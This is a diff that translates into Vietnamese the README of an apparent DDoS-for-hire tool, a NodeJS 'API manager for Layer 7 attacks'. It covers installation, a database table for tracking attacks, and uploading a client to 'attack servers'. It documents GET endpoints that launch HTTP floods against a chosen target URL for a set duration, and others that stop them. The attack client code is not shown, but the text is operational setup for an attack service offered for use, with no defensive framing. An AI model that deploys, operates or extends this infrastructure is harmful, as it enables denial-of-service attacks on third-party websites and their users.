@@ -1,11 +1,8 @@
-<h2>NodeJS API Manager for Layer 7 attacks</h2>
+<h2>Trình quản lý API NodeJS cho các cuộc tấn công Lớp 7</h2>
 
-<h3>Coded by forky (tg: @yfork)</h3>
+<h4>API này rất an toàn và nhanh chóng (mất 2 lần ping giữa API và phần phụ trợ, tức là ping là 60ms, sẽ chỉ mất 120ms để khởi động cuộc tấn công)</h4>
 
-<h4>This API is very secure and fast (takes 2x the ping between the API and the backend, i.e. the ping is 60ms it will take only 120ms to launch the attack)</h4>
-
-
-<h1>Installation:</h1>
+<h1>Cài đặt:</h1>
 
 ```sh
 curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
@@ -61,11 +58,11 @@ npm i express mysql
 
 ```js
 const socket_port = 3000; // cổng API
-const socket_token = "SECRET_TOKEN"; //mã thông báo bí mật của bạn để bảo vệ kết nối TCP
+const socket_token = "SECRET_TOKEN"; // mã thông báo bí mật của bạn để bảo vệ kết nối TCP
 const allowed_ips = ['1.1.1.1']; // IP máy chủ API
 ```
 
-<h3>Setup the Database</h3><br>
+<h3>Thiết lập cơ sở dữ liệu</h3><br>
 
 ```sql
 CREATE DATABASE manager;
@@ -88,11 +85,11 @@ ALTER TABLE `attacks` ADD PRIMARY KEY (`id`);
 ALTER TABLE `attacks` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 ```
 
-## After that, upload client.js to the attack servers and upload api.js, servers.json, commands.json and settings.json to the API server
+## Sau đó, tải client.js lên máy chủ tấn công và tải api.js, server.json, command.json và settings.json lên máy chủ API
 
-### Reverse Proxy
+### Proxy ngược
 
-Making a reverse proxy using Nginx to use your API is recommended:
+Nên tạo proxy ngược bằng Nginx để sử dụng API của bạn:
 
 ```conf
 server {
@@ -104,22 +101,22 @@ server {
 }
 ```
 
-Replace `'http://backend:3000/api'` with your API server URL
+Thay thế `'http://backend:3000/api'` bằng URL máy chủ API của bạn
 
-### Using the API
+### Sử dụng API
 
-Send a GET request to the API using the required fields
+Gửi yêu cầu GET tới API bằng các trường bắt buộc
 
 GET `https://api.yourdomain.com/api/attack?target=https://website.com&duration=120&method=HTTPGET&server=1`
 
-You can stop the attacks by sending a GET request to the API using the attack ID
+Bạn có thể ngăn chặn các cuộc tấn công bằng cách gửi yêu cầu GET tới API bằng ID tấn công
 
 GET `https://api.yourdomain.com/api/stop?attack_id=[id]`
 
-You can also view all running attacks and server usage by sending a GET request to the API
+Bạn cũng có thể xem tất cả các cuộc tấn công đang diễn ra và việc sử dụng máy chủ bằng cách gửi yêu cầu GET tới API
 
 GET `https://api.yourdomain.com/api/status`
 
-You can also stop all the attacks sending a GET request to the API
+Bạn cũng có thể dừng tất cả các cuộc tấn công gửi yêu cầu GET tới API
 
 GET `https://api.yourdomain.com/api/stop_all`
